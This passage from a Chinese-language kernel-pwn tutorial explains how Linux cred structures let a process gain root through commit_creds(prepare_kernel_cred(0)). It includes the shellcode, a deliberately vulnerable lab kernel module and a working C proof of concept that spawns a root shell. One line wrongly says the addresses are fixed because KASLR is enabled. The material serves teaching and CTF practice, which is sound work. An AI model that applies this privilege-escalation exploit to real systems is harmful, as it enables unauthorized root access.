上面所述的都是在32位环境下的查找方式，在64位上的方式还是通过gs寄存器，代码如下：
    .text:FFFFFFFF810A77E0 __x64_sys_getuid proc near              ; DATA XREF: .rodata:FFFFFFFF820004F0↓o
    .text:FFFFFFFF810A77E0                                         ; .rodata:FFFFFFFF82001BD8↓o ...
    .text:FFFFFFFF810A77E0                 call    __fentry__      ; Alternative name is '__ia32_sys_getuid'
    .text:FFFFFFFF810A77E5                 push    rbp
    .text:FFFFFFFF810A77E6                 mov     rax, gs:current_task
    .text:FFFFFFFF810A77EF                 mov     rax, [rax+0A48h]
    .text:FFFFFFFF810A77F6                 mov     rbp, rsp
    .text:FFFFFFFF810A77F9                 mov     esi, [rax+4]
    .text:FFFFFFFF810A77FC                 mov     rdi, [rax+88h]
    .text:FFFFFFFF810A7803                 call    from_kuid_munged
    .text:FFFFFFFF810A7808                 mov     eax, eax
    .text:FFFFFFFF810A780A                 pop     rbp
    .text:FFFFFFFF810A780B                 retn
    .text:FFFFFFFF810A780B __x64_sys_getuid endp
#### 权限提升
在获取到`task_struct`结构体后，我们比较关注的就是其中的`cred`结构，在`task_struct`中包含多个`cred`结构，如下：
    /* Process credentials: */
        /* Tracer's credentials at attach: */
        const struct cred __rcu     *ptracer_cred;
        /* Objective and real subjective task credentials (COW): */
        const struct cred __rcu     *real_cred;
        /* Effective (overridable) subjective task credentials (COW): */
        const struct cred __rcu     *cred;
比较重要的是`real_cred`以及`cred`，它代表了linux内核中credential机制中的主、客体关系，主体提供自己权限的证书，客体提供访问自己所需权限的证书，根据主客体提供的证书及操作做安全性检查，其中`cred`代表了主体证书，`real_cred`则代表了客体证书，`cred`结构体内容如下：
    struct cred {
        atomic_t    usage;
    #ifdef CONFIG_DEBUG_CREDENTIALS
        atomic_t    subscribers;    /* number of processes subscribed */
        void        *put_addr;
        unsigned    magic;
    #define CRED_MAGIC  0x43736564
    #define CRED_MAGIC_DEAD 0x44656144
    #endif
        kuid_t      uid;        /* real UID of the task */
        kgid_t      gid;        /* real GID of the task */
        kuid_t      suid;       /* saved UID of the task */
        kgid_t      sgid;       /* saved GID of the task */
        kuid_t      euid;       /* effective UID of the task */
        kgid_t      egid;       /* effective GID of the task */
        kuid_t      fsuid;      /* UID for VFS ops */
        kgid_t      fsgid;      /* GID for VFS ops */
        unsigned    securebits; /* SUID-less security management */
        kernel_cap_t    cap_inheritable; /* caps our children can inherit */
        kernel_cap_t    cap_permitted;  /* caps we're permitted */
        kernel_cap_t    cap_effective;  /* caps we can actually use */
        kernel_cap_t    cap_bset;   /* capability bounding set */
        kernel_cap_t    cap_ambient;    /* Ambient capability set */
    #ifdef CONFIG_KEYS
        unsigned char   jit_keyring;    /* default keyring to attach requested
                         * keys to */
        struct key __rcu *session_keyring; /* keyring inherited over fork */
        struct key  *process_keyring; /* keyring private to this process */
        struct key  *thread_keyring; /* keyring private to this thread */
        struct key  *request_key_auth; /* assumed request_key authority */
    #endif
    #ifdef CONFIG_SECURITY
        void        *security;  /* subjective LSM security */
    #endif
        struct user_struct *user;   /* real user ID subscription */
        struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
        struct group_info *group_info;  /* supplementary groups for euid/fsgid */
        struct rcu_head rcu;        /* RCU deletion hook */
    } __randomize_layout;
一般来说，提权过程可以通过如下两个函数来实现，`commit_creds(prepare_kernel_cred(0))`
，其中`prepare_kernel_cred(0)`负责生成一个具有`root`权限的`cred`结构（本质上是获取到了init进程即 **0号进程**
的cred结构），`commit_creds()`则负责将对应的`cred`结构体进行替换，这样让当前进程具有`root`权限，感兴趣同学的可以阅读这两个函数的源码。
那么shellcode该如何确定这两个函数的地址呢，在我们默认的环境中是开启了`kaslr`的，所以这两个函数地址是固定的，我们可以通过ida等工具对`vmlinux`这个可执行内核文件进行分析，加载成功后寻找`commit_creds`函数，如下：
    text:FFFFFFFF810B9810                   commit_creds    proc near               ; CODE XREF: sub_FFFFFFFF810913D5+290↑p
    .text:FFFFFFFF810B9810                                                           ; sub_FFFFFFFF8109D865+15A↑p ...
    .text:FFFFFFFF810B9810 E8 3B 7F B4 00                    call    __fentry__
    .text:FFFFFFFF810B9815 55                                push    rbp
    .text:FFFFFFFF810B9816 48 89 E5                          mov     rbp, rsp
    .text:FFFFFFFF810B9819 41 55                             push    r13
    .text:FFFFFFFF810B981B 41 54                             push    r12
    .text:FFFFFFFF810B981D 53                                push    rbx
`__fentry__`这个函数仅仅返回，因此可以视为nop指令，所以`commit_creds`函数本质是从`FFFFFFFF810B9815`开始的，当然这里选择0xFFFFFFFF810B9810作为`commit_creds`函数地址，`prepare_kernel_cred`函数如下：
    text:FFFFFFFF810B9C00                   prepare_kernel_cred proc near           ; CODE XREF: 
    .text:FFFFFFFF810B9C00 E8 4B 7B B4 00                    call    __fentry__
    .text:FFFFFFFF810B9C05 55                                push    rbp
    .text:FFFFFFFF810B9C06 BE C0 00 60 00                    mov     esi, 6000C0h
    .text:FFFFFFFF810B9C0B 48 89 E5                          mov     rbp, rsp
    .text:FFFFFFFF810B9C0E 41 54                             push    r12
    .text:FFFFFFFF810B9C10 49 89 FC                          mov     r12, rdi
    .text:FFFFFFFF810B9C13 48 8B 3D 26 26 AD+                mov     rdi, cs:cred_jar
    .text:FFFFFFFF810B9C13 01
    .text:FFFFFFFF810B9C1A 53                                push    rbx
    .text:FFFFFFFF810B9C1B E8 00 68 1B 00                    call    kmem_cache_alloc
    .text:FFFFFFFF810B9C20 48 85 C0                          test    rax, rax
    .text:FFFFFFFF810B9C23 0F 84 E2 00 00 00                 jz      loc_FFFFFFFF810B9D0B
    .text:FFFFFFFF810B9C29 4D 85 E4                          test    r12, r12
    .text:FFFFFFFF810B9C2C 48 89 C3                          mov     rbx, rax
    .text:FFFFFFFF810B9C2F 0F 84 AB 00 00 00                 jz      loc_FFFFFFFF810B9CE0
因此选择0xFFFFFFFF810B9C00作为`prepare_kernel_cred`函数地址，这样一个简易的shellcode就成形了，如下：
    xor rdi,rdi
    mov rbx,0xFFFFFFFF810B9C00
    call rbx
    mov rbx,0xFFFFFFFF810B9810
    call rbx
    ret
当然，获取函数地址的方式还有其它多种，比如通过调试器或者`/proc/kallsyms`等，这里不再赘述。
当然也有其它方式进行权限提升，系统在判断一个进程的权限时通常是通过检测`cred`结构体中的`uid`、`gid`一直到`fsgid`，如果它们都为0，则默认当前是root权限，所以我们可以通过定位当前进程的`cred`结构并对其内部的数据内容进行修改也可达到提权的目的。
### 样例
#### 基本概念
  1. 可加载模块
linux内核最初采用的是宏内核架构，其基本特性就是内核的所有操作集中于一个可执行文件中，这样的好处是模块间不需要通信可以直接调用，有效的提高了内核的运行速度，但是缺点是缺乏可扩展性。因此linux从2.6版本后完善并引入了可装载内核模块（LKMS），这样可以在内核中加载独立的可执行模块，为扩展内核功能提供了较大便利。一般通过以下命令操纵可装载内核模块：
        insmod  装载内核模块
    lsmod    列出内核模块
    rmod 卸载内核模块
在通常的ctf比赛中，大部分题目都会选择给出一个存在漏洞的内核模块，选手需要分析该模块并进行针对性的漏洞利用。
  2. 保护机制
a. `KASLR` **内核空间地址随机化，类似于用户层的ASLR**
b. `stack protector` **类似于用户层的stack canary，在内核栈上添加了cookie以防御内核栈溢出**
c. `SMAP` **管理模式访问保护，禁止内核层访问用户态数据**
d. `SMEP` **管理模式执行保护，禁止内核层执行用户态代码**
e. `MMAP_MIN_ADDR` **mmap函数能申请的最小地址，空指针类型的漏洞无法利用**
f. `KPTI` **内核页表隔离，主要目的为了缓解cpu侧信道攻击以及kaslr绕过**
  3. 用户与内核间的交互
a. `syscall` **在用户空间和内核空间之间，有一个叫做Syscall(系统调用, system
call)的中间层，是连接用户态和内核态的桥梁。这样即提高了内核的安全型，也便于移植，只需实现同一套接口即可。Linux系统，用户空间通过向内核空间发出Syscall，产生软中断，从而让程序陷入内核态，执行相应的操作**
b. `iotcl` **本质上也是一个系统调用，只是它是用来直接向驱动设备发送或者接收指令、数据。**
c. `open、read、write` **由于驱动设备被映射为文件，因此可通过访问文件的方式对驱动进行操作**
  4. 漏洞类型
a. `UNINITIALIZED/NONVALIDATED/CORRUPTED POINTER DEREFERENCE` **内核空指针解引用**
b. `MEMORY CORRUPTION` **内核栈漏洞、内核堆漏洞**
c. `INTEGER ISSUES` **（算术）整数溢出、符号转换问题**
d. `RACE CONDITIONS` **double fetch漏洞**
  5. 漏洞样例
本次利用一个存在空指针解引用的漏洞进行内核提权，模块的源码如下：
        #include 
    #include 
    #include 
    #include 
    #include 
    void (*my_funptr)(void) = 0x10000;
    ssize_t nullp_write(struct file *file,const char __user *buf,size_t len,loff_t *loff)
    {
            my_funptr();
            return len;
    }
    static int __init null_dereference_init(void)
    {
            printk(KERN_ALERT "null_dereference driver init!n");
            static const struct file_operations mytest_proc_fops = {
                    .write = nullp_write,
            };
            proc_create("test_kernel_npd",0666,0,&mytest_proc_fops);
            return 0;
    }
    static void __exit null_dereference_exit(void)
    {
            printk(KERN_ALERT "null_dereference driver exitn");
    }
    module_init(null_dereference_init);
    module_exit(null_dereference_exit);
虽然说是空指针解引用，但其实由于linux内核中的`MMAP_MIN_ADDR`缓解机制导致在用户层通过`mmap`函数申请0地址失败，因此将要调用的函数地址改到了`0x10000`，这样用户层也可以控制这个地址，方便后面的漏洞利用。
首先利用qemu启动对应的操作系统，这里由于默认的busybox根文件系统无法正常通过`adduser`添加其它用户，因此这里笔者直接使用了[ubuntu16
base](http://cdimage.ubuntu.com/ubuntu-base/releases/16.04/release/)作为根文件系统，并添加一个test用户，这样便于查看提权是否成功。启动系统后通过`insmod`命令装载存在漏洞的内核模块，如下：
然后通过`su test`切换到test用户，如下：
poc代码如下，编译后已经提前放到了根文件系统目录下，直接执行就好
    #include 
       #include 
       #include 
       #include 
       #include 
       #include 
       unsigned char* mypoc = "H1\xffH\xc7\xc3\x00\x9c\x0b\x81\xff\xd3H\xc7\xc3\x10\x98\x0b\x81\xff\xd3\xc3";
       int main()
       {
           void* addr0 = mmap(0x10000,4096,PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS ,-1, 0);
           memcpy(addr0,mypoc,24);
           int mfd = open("/proc/test_kernel_npd",O_RDWR);
           int res= write(mfd,"run shellcode",14);
           system("/bin/bash");
           return 0;
       }
执行结果如下:
此时可以看出已经成功提权。
#### reference
  1. [【系列分享】Linux 内核漏洞利用教程（二）：两个Demo - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/85840)
  2. [从零开始的 kernel pwn 入门 - I：Linux kernel 简易食用指南 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/258874#h3-12)